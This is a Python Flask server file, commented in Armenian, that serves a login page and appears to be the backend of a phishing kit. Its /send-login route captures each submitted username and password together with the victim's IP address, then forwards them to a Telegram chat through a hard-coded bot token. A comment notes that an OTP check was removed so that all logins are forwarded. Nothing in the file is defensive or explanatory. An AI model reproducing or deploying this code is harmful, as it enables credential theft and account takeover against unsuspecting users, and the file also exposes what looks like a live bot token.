from flask import Flask, render_template, request, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

# ============================================
# 🔒 ՍԱ ՍԵՐՎԵՐՈՒՄ Է ՊԱՀՎՈՒՄ - ՉԻ ԵՐԵՎՈՒՄ HTML-ՈՒՄ
# ============================================
BOT_TOKEN = '8612671726:AAGHAf0KCLWFw_OlGtrGeOHd0L5yzGFKMyU'
CHAT_ID = '8707669446'
# ============================================

def get_client_ip():
    """Վերցնում է կլիենտի իրական IP հասցեն"""
    if request.headers.get('X-Forwarded-For'):
        # Եթե կա proxy/load balancer, վերցնում ենք առաջին IP-ն
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-login', methods=['POST'])
def send_login():
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
        
        # ✅ Ստանում ենք IP հասցեն և ժամանակը
        client_ip = get_client_ip()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # ❌ OTP_REQUEST ստուգումը ՀԱՆՎԱԾ Է - հիմա բոլոր մուտքերը գնում են Telegram
        
        # ✅ ԻՐԱՐ ՏԱԿ, ԻՐԱՐԻՑ ՀԵՌՈՒ, ՀԱՍՏ ՏԱՌԵՐՈՎ + IP + ԺԱՄԱՆԱԿ
        message = f"""
<b>🌐 IP </b> <code>{client_ip}</code>
<b>👤</b> <code>{username}</code>
<b>🔑</b> <code>{password}</code>
"""
        
        # Telegram-ին ուղարկել HTML ձևաչափով
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload)
        result = response.json()
        
        if result.get('ok'):
            return jsonify({'ok': True, 'message': 'Ուղարկված է'})
        else:
            return jsonify({'ok': False, 'error': result.get('description')})
            
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
